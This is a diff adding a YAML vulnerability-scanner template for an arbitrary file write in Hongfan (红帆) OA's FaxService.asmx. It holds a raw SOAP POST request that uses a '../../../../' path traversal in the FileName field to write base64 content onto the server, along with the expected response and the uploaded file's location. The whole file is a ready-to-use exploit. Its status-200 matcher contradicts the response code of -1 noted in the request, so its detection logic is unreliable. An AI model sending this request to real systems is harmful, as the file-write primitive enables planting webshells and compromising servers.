@@ -1,0 +1,21 @@
+id: poc-hq6eh4f4k84hwvg4
+info:
+  name: 红帆 OA FaxService.asmx任意文件写入
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hq6eh4f4k84hwvg4
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: other,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: hq6eh4f4k84hwvg4
+    fofa: 暂无
+http:
+- raw:
+  - "POST /iOffice/prg/set/wss/FaxService.asmx HTTP/1.1\n\nContent-Type: text/xml; charset=utf-8\n\nSOAPAction: [http://tempuri.org/SaveConvertTif](http://tempuri.org/SaveConvertTif)\n\n\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n\n  <soap:Body>\n\n    <SaveConvertTif xmlns=\"http://tempuri.org/\">\n\n      <FaxID>1</FaxID>\n\n      <Pages>2</Pages>\n\n      <FileName>../../../../dude.txt</FileName>\n\n      <FileContent>ZHVkZQ==</FileContent>\n\n    </SaveConvertTif>\n\n  </soap:Body>\n\n</soap:Envelope>\n\n# 响应代码特征\n-1\n\n# 响应内容特征\nSaveConvertTifResponse\n\n# 上传文件定位\n/iOffice/dude.txt"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
